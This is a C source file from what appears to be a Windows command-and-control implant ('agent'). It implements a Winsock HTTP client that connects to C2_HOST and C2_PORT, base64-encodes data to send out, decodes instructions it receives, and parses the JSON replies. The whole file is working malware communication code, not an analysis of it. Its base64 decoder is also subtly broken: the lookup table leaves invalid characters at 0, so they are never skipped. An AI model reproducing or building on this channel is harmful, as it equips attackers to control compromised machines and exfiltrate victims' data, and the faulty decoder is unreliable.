/*
 * http_client.c - Winsock HTTP client + JSON helpers + Base64 codec
 *
 * Provides:
 *   - http_request() - minimal HTTP/1.0 client (POST/GET)
 *   - json_find_str() - find string value for a key in small JSON responses
 *   - base64_encode() - heap-allocated base64 encoder (for sending data)
 *   - base64_decode() - heap-allocated base64 decoder (for receiving args)
 *
 * IMPORTANT: All large buffers are HEAP-allocated to avoid stack overflow.
 */

#include "agent.h"

/* ====== Base64 decoder (heap-allocated) ====== */
/* Decodes base64 string to binary. Returns malloc'd buffer, caller must free.
 * Sets *out_len to decoded length. Returns NULL on error. */
uint8_t* base64_decode(const char* b64, int* out_len) {
    static const int8_t b64_table[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,
        ['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,
        ['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,
        ['y']=50,['z']=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
        ['8']=60,['9']=61,['+']=62,['/']=63,
    };

    if (!b64 || !out_len) return NULL;
    int b64_len = (int)strlen(b64);
    if (b64_len == 0) {
        *out_len = 0;
        return (uint8_t*)malloc(1);  /* empty but non-NULL */
    }

    /* Count valid base64 chars (skip whitespace, count padding) */
    int valid = 0, padding = 0;
    for (int i = 0; i < b64_len; i++) {
        char c = b64[i];
        if (c == '=') padding++;
        else if (c == '+' || c == '/' || (c >= 'A' && c <= 'Z') ||
                 (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
            valid++;
        }
        /* skip everything else (whitespace, newlines) */
    }

    if (valid == 0) {
        *out_len = 0;
        return (uint8_t*)malloc(1);
    }

    /* Output size = (valid/4)*3, minus padding */
    int groups = valid / 4;
    int out_cap = groups * 3 + 3;  /* +3 for safety */
    uint8_t* out = (uint8_t*)malloc(out_cap);
    if (!out) return NULL;

    int o = 0;
    uint32_t accum = 0;
    int bits = 0;

    for (int i = 0; i < b64_len; i++) {
        char c = b64[i];
        if (c == '=') continue;
        int8_t val = b64_table[(unsigned char)c];
        if (val < 0) continue;  /* skip invalid chars */

        accum = (accum << 6) | (uint32_t)val;
        bits += 6;

        if (bits >= 8) {
            bits -= 8;
            out[o++] = (uint8_t)((accum >> bits) & 0xFF);
        }
    }

    *out_len = o;
    return out;
}

/* ====== Base64 encoder (heap-allocated) ====== */
char* base64_encode(const char* data, size_t len) {
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    /* Output size: ceil(len/3)*4 + 1 for NUL */
    size_t out_cap = ((len + 2) / 3) * 4 + 1;
    char* out = (char*)malloc(out_cap);
    if (!out) return NULL;

    size_t i = 0, o = 0;
    while (i + 2 < len) {
        uint32_t v = ((uint8_t)data[i] << 16) | ((uint8_t)data[i+1] << 8) | (uint8_t)data[i+2];
        out[o++] = b64[(v >> 18) & 0x3F];
        out[o++] = b64[(v >> 12) & 0x3F];
        out[o++] = b64[(v >> 6)  & 0x3F];
        out[o++] = b64[v         & 0x3F];
        i += 3;
    }
    int rem = (int)(len - i);
    if (rem > 0) {
        uint32_t v = (uint8_t)data[i] << 16;
        if (rem > 1) v |= (uint8_t)data[i+1] << 8;
        out[o++] = b64[(v >> 18) & 0x3F];
        out[o++] = b64[(v >> 12) & 0x3F];
        out[o++] = (rem == 1) ? '=' : b64[(v >> 6) & 0x3F];
        out[o++] = '=';
    }
    out[o] = 0;
    return out;
}

/* ====== HTTP request (winsock + HTTP/1.0) ====== */
int http_request(const char* method, const char* path,
                 const char* body, int body_len,
                 char* resp_buf, int resp_cap, int* resp_len)
{
    static int wsa_init = 0;
    if (!wsa_init) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;
        wsa_init = 1;
    }

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &sa.sin_addr);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;

    DWORD to = HTTP_TIMEOUT_MS;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&to, sizeof(to));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&to, sizeof(to));

    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return -2;  /* server unreachable */
    }

    /* Build HTTP request - small, on stack is fine */
    char req[8192];
    int req_len = _snprintf(req, sizeof(req),
        "%s /%s HTTP/1.0\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n",
        method, path, C2_HOST, C2_PORT, body_len);

    if (req_len < 0 || (size_t)req_len >= sizeof(req)) {
        closesocket(s);
        return -1;
    }

    /* Send headers */
    if (send(s, req, req_len, 0) == SOCKET_ERROR) {
        closesocket(s);
        return -1;
    }
    /* Send body in chunks if large */
    if (body_len > 0 && body) {
        int sent = 0;
        while (sent < body_len) {
            int chunk = body_len - sent;
            if (chunk > 16384) chunk = 16384;
            int n = send(s, body + sent, chunk, 0);
            if (n == SOCKET_ERROR || n == 0) { closesocket(s); return -1; }
            sent += n;
        }
    }

    /* Receive response */
    int total = 0;
    while (total < resp_cap - 1) {
        int n = recv(s, resp_buf + total, resp_cap - 1 - total, 0);
        if (n <= 0) break;
        total += n;
    }
    resp_buf[total] = 0;
    closesocket(s);

    /* Find end of HTTP headers (\r\n\r\n) */
    char* body_start = strstr(resp_buf, "\r\n\r\n");
    if (!body_start) {
        *resp_len = 0;
        return -1;
    }
    body_start += 4;
    int body_size = total - (int)(body_start - resp_buf);
    if (body_size < 0) body_size = 0;
    memmove(resp_buf, body_start, body_size);
    resp_buf[body_size] = 0;
    *resp_len = body_size;
    return 0;
}

/* ====== JSON helper ====== */
int json_find_str(const char* json, const char* key, char* out, int out_cap) {
    char pat[64];
    _snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = strstr(json, pat);
    if (!p) { out[0] = 0; return 0; }
    p += strlen(pat);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t')) p++;
    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < out_cap - 1) {
            if (*p == '\\' && p[1]) p++;
            out[i++] = *p++;
        }
        out[i] = 0;
        return i;
    } else {
        int i = 0;
        while (*p && *p != ',' && *p != '}' && *p != '\n' && i < out_cap - 1)
            out[i++] = *p++;
        out[i] = 0;
        return i;
    }
}
